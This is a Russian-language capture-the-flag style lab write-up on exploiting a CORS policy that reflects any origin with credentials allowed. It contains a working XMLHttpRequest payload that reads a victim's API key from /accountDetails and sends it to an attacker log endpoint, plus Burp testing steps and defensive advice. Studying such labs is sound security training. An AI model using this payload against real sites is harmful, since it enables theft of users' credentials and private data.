<a id="goal"></a>

## 🎯 Цель

Эксплуатировать неправильно настроенную политику CORS для:

```text
1. Обхода политики одного источника (Same-Origin Policy, SOP).
2. Выполнения кросс-доменного JavaScript для доступа к защищенному эндпоинту (`/accountDetails`).
3. Кражи конфиденциальной информации авторизованной жертвы (API-ключа).
4. Эксфильтрации данных на сервер злоумышленника.
```

<a id="theory"></a>

## 🧠 Краткая теория
Политика одного источника (SOP) — это фундаментальный механизм безопасности браузера, который ограничивает взаимодействие документа или скрипта, загруженного из одного источника, с ресурсом из другого источника.

Cross-Origin Resource Sharing (CORS) — это механизм, который ослабляет SOP. Он позволяет серверам явно объявлять, каким внешним доменам разрешено читать их ответы. Если сервер настроен неправильно и доверяет любому произвольному домену, злоумышленники могут разместить вредоносный веб-сайт, который заставит браузер жертвы сделать кросс-доменный запрос и прочитать конфиденциальный ответ.

<a id="idea"></a>

## 🧩 Ключевая идея
Целевое приложение динамически отражает любое значение, переданное в HTTP-заголовке `Origin`, в заголовок ответа `Access-Control-Allow-Origin` (ACAO). Что еще более важно, оно также устанавливает `Access-Control-Allow-Credentials: true`.

```text
Сайт атакующего:    Выполняет AJAX-запрос к целевому API.
Браузер жертвы:     Автоматически прикрепляет сессионные cookie к запросу.
Целевой сервер:     Отражает источник атакующего и обрабатывает запрос.
Браузер жертвы:     Читает ответ (потому что заголовки CORS разрешают это).
Сайт атакующего:    Эксфильтрует прочитанный ответ (API-ключ) на сервер эксплойтов ✅
```

<a id="headers"></a>

## 📡 Уязвимые заголовки
Когда злоумышленник отправляет запрос с поддельным источником:
`Origin: https://evil.com`

Уязвимый сервер отвечает:
```http
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```
Эта конкретная комбинация говорит браузеру жертвы: *"Безопасно позволить `https://evil.com` прочитать этот ответ, и да, вы должны включить сессионные куки пользователя"*.

<a id="exploit"></a>

## ⚡ Пейлоад эксплойта
Злоумышленник использует простой `XMLHttpRequest` (или `fetch`) для выполнения кросс-доменного запроса. Ключевым свойством является `req.withCredentials = true`, которое предписывает браузеру включить сессионные cookie жертвы, гарантируя, что запрос аутентифицирован.

<a id="step1"></a>

## 🔍 Шаг 1 — Поиск целевого эндпоинта
Авторизуйтесь в приложении и перейдите на страницу аккаунта пользователя.
Используйте историю HTTP в Burp Suite, чтобы найти фоновый запрос, который извлекает данные пользователя.
Определите эндпоинт: `GET /accountDetails`.

<a id="step2"></a>

## 🔍 Шаг 2 — Тестирование отражения источника
Отправьте запрос `/accountDetails` в Burp Repeater.
Добавьте поддельный заголовок источника: `Origin: https://example.com`.
Проанализируйте ответ. Если сервер отражает `https://example.com` в заголовке `Access-Control-Allow-Origin` и включает `Access-Control-Allow-Credentials: true`, эндпоинт уязвим для эксплуатации CORS.

<a id="step3"></a>

## 🔍 Шаг 3 — Создание эксплойта
Откройте Exploit Server.
Напишите HTML/JS пейлоад, который отправляет GET-запрос на `/accountDetails`.
Убедитесь, что включено `withCredentials`.
В функции обратного вызова `onload` (когда получен ответ) перенаправьте браузер на путь логов сервера эксплойтов, добавив текст ответа в качестве параметра запроса.

<a id="step4"></a>

## 🔍 Шаг 4 — Отправка эксплойта жертве
Нажмите **Store**, чтобы сохранить пейлоад.
Нажмите **Deliver exploit to victim**.
Браузер жертвы выполняет скрипт, извлекает собственный API-ключ и отправляет его в логи злоумышленника.
Проверьте Access Log, чтобы извлечь API-ключ администратора.

<a id="examples"></a>

## 📨 Пример HTML-пейлоада
Пейлоад (Раздел Body на сервере эксплойтов)
```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

<a id="attack-chain"></a>

## 🧾 Полная цепочка атаки
```text
1. Определение эндпоинта извлечения конфиденциальных данных (`/accountDetails`).
2. Подтверждение динамического отражения источника в заголовках CORS.
3. Подтверждение поддержки учетных данных (`Access-Control-Allow-Credentials: true`).
4. Написание JS-пейлоада (XMLHttpRequest) для извлечения данных.
5. Извлечение ответа и добавление его к URL-адресу логгирования атакующего.
6. Доставка пейлоада жертве.
7. Извлечение украденного API-ключа из логов сервера.
```

<a id="breakdown"></a>

## 🔬 Почему атака сработала
1. Слепое доверие к источнику
Сервер не проверял заголовок `Origin` по строгому белому списку. Он слепо отражал любую строку, предоставленную клиентом.

2. Разрешенные учетные данные
Явно разрешив использование учетных данных (куки), сервер обошел встроенные средства защиты кросс-доменных запросов, позволив скрипту злоумышленника действовать от имени аутентифицированной жертвы.

<a id="pentester"></a>

## 🧠 Как думать как пентестер
При тестировании API и эндпоинтов данных:

```text
Отражает ли сервер динамически произвольные заголовки Origin?
Если да, разрешает ли он также учетные данные (credentials)? (Без учетных данных отражение CORS часто бесполезно для кражи сессионных данных).
Являются ли извлекаемые данные действительно конфиденциальными (PII, токены, API-ключи)?
```

<a id="mistakes"></a>

## ❌ Типичные ошибки
Ошибка 1. Нацеливание на неверный эндпоинт
Отправка XMLHttpRequest на `/my-account` (HTML-страница) вместо `/accountDetails` (JSON API). Браузер попытается впихнуть весь исходный код HTML в строку запроса URL, что часто приводит к сбою запроса из-за ограничений длины URI.

Ошибка 2. Забытый `withCredentials`
Если `req.withCredentials = true;` пропущен, браузер отправляет анонимный запрос. Сервер, скорее всего, ответит ошибкой 401 Unauthorized, и скрипт извлечет сообщение об ошибке вместо API-ключа.

<a id="defense"></a>

## 🛡 Защита
1. Строгий белый список
Настройте сервер на использование строгого белого списка доверенных доменов. Никогда не отражайте динамически произвольные заголовки `Origin`.

2. Избегайте подстановочных знаков с учетными данными
Никогда не используйте подстановочный знак `*` для `Access-Control-Allow-Origin`, если `Access-Control-Allow-Credentials` установлено в `true` (браузеры на самом деле блокируют эту комбинацию, поэтому ленивые разработчики используют динамическое отражение, чтобы обойти это ограничение).

<a id="conclusion"></a>

## 🧾 Итог
Лаборатория продемонстрировала опасности неправильно настроенных политик CORS:

```text
1. Доказано, что динамическое отражение источника эффективно уничтожает защиту Same-Origin Policy.
2. Успешно автоматизирована кросс-доменная кража данных с использованием JavaScript.
```

Главные выводы:
```text
- CORS — это ослабление безопасности; он должен быть реализован со строгими белыми списками.
- Отражение заголовка Origin функционально эквивалентно разрешению любому домену читать данные.
- API-эндпоинты, возвращающие конфиденциальный JSON, являются главными целями для эксплуатации CORS.
```
